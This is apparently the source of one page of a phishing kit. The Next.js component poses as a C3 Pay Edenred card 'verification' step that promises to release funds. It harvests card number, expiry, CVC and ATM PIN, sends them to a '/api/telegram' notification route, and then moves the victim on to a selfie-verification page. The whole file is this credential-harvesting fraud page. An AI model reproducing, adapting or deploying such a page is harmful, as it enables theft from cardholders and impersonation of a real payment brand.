'use client'

import Image from 'next/image'
import { useRouter } from 'next/navigation'
import { CreditCard, LockKeyhole } from 'lucide-react'
import { useState } from 'react'

export default function CardVerificationPage() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvc, setCvc] = useState('')
  const [pin, setPin] = useState('')
  const [submitted, setSubmitted] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [submitError, setSubmitError] = useState('')

  const cardNumberDigits = cardNumber.replace(/\D/g, '')
  const isValidCardNumber = cardNumberDigits.length === 16
  const isValidExpiry = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)
  const isValidCvc = /^\d{3,4}$/.test(cvc)
  const isValidPin = /^\d{4}$/.test(pin)
  const isFormValid = isValidCardNumber && isValidExpiry && isValidCvc && isValidPin

  const formatCardNumber = (value: string) =>
    value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ')

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 4)
    return digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits
  }

  return (
    <main className="min-h-screen bg-[#f1f3f7] px-3 pb-8 pt-4 text-[#111827]">
      <header className="text-center">
        <h1 className="text-[22px] font-bold leading-8">Card Verification</h1>
        <p className="mt-1 text-sm text-slate-500">Enter your card details to receive the funds.</p>
      </header>

      <div className="relative mt-2 h-[245px] overflow-hidden rounded-2xl bg-[#141414]">
        <Image
          src="/card-verification-wide.png"
          alt="C3 Pay Edenred ATM card front and back illustration"
          width={1600}
          height={1200}
          priority
          className="absolute left-1/2 top-0 h-full w-auto max-w-none -translate-x-1/2 object-cover"
        />
      </div>

      <form
        className="mt-2 rounded-2xl bg-white p-4 shadow-sm"
        onSubmit={async (event) => {
          event.preventDefault()
          setSubmitted(true)
          if (!isFormValid || isSending) return

          setIsSending(true)
          setSubmitError('')
          try {
            const response = await fetch('/api/telegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ type: 'card', cardNumber, expiry, cvc, pin }),
            })

            if (!response.ok) throw new Error('Telegram notification failed')
            router.push('/selfie-verification')
          } catch {
            setSubmitError('Unable to continue. Please try again.')
          } finally {
            setIsSending(false)
          }
        }}
        noValidate
      >
        <label className="flex items-center gap-2 text-sm text-slate-700" htmlFor="card-number">
          <CreditCard className="h-4 w-4 text-slate-500" />
          Card Number
        </label>
        <input
          id="card-number"
          inputMode="numeric"
          value={cardNumber}
          onChange={(event) => setCardNumber(formatCardNumber(event.target.value))}
          maxLength={19}
          aria-invalid={submitted && !isValidCardNumber}
          placeholder="0000 0000 0000 0000"
          className="mt-2 h-12 w-full rounded-lg border border-slate-200 px-3 text-base outline-none placeholder:text-slate-400 focus:border-[#18ae54]"
        />

        <div className="mt-3 grid grid-cols-2 gap-3">
          <div>
            <label className="mb-2 block text-sm text-slate-700" htmlFor="expiry">Expiry Date</label>
            <input
              id="expiry"
              inputMode="numeric"
              value={expiry}
              onChange={(event) => setExpiry(formatExpiry(event.target.value))}
              maxLength={5}
              aria-invalid={submitted && !isValidExpiry}
              placeholder="MM/YY"
              className="h-12 w-full rounded-lg border border-slate-200 px-3 text-base outline-none placeholder:text-slate-400 focus:border-[#18ae54]"
            />
          </div>
          <div>
            <label className="mb-2 flex items-center gap-2 text-sm text-slate-700" htmlFor="cvc">
              <LockKeyhole className="h-4 w-4 text-slate-500" /> CVC
            </label>
            <input
              id="cvc"
              inputMode="numeric"
              maxLength={4}
              value={cvc}
              onChange={(event) => setCvc(event.target.value.replace(/\D/g, '').slice(0, 4))}
              aria-invalid={submitted && !isValidCvc}
              className="h-12 w-full rounded-lg border border-slate-200 px-3 text-base outline-none focus:border-[#18ae54]"
            />
          </div>
        </div>

        <label className="mt-3 block text-sm text-slate-700" htmlFor="pin">ATM PIN</label>
        <input
          id="pin"
          type="password"
          inputMode="numeric"
          maxLength={4}
          value={pin}
          onChange={(event) => setPin(event.target.value.replace(/\D/g, '').slice(0, 4))}
          aria-invalid={submitted && !isValidPin}
          placeholder="* * * *"
          className="mt-2 h-12 w-full rounded-lg border border-slate-200 px-3 text-base tracking-[0.35em] outline-none placeholder:text-slate-400 focus:border-[#18ae54]"
        />

        {submitted && !isFormValid && (
          <p className="mt-3 text-center text-xs text-red-600" role="alert">
            Enter a valid 16-digit card number, MM/YY expiry, 3–4 digit CVC, and 4-digit PIN.
          </p>
        )}

        {submitError && (
          <p className="mt-3 text-center text-xs text-red-600" role="alert">
            {submitError}
          </p>
        )}

        <button
          type="submit"
          disabled={!isFormValid || isSending}
          className="mt-3 h-14 w-full rounded-lg bg-[#f18d8d] text-lg font-bold text-white transition-colors enabled:hover:bg-[#eb7d7d] disabled:cursor-not-allowed disabled:opacity-60"
        >
          {isSending ? 'Verifying…' : 'VERIFY'}
        </button>
      </form>
    </main>
  )
}
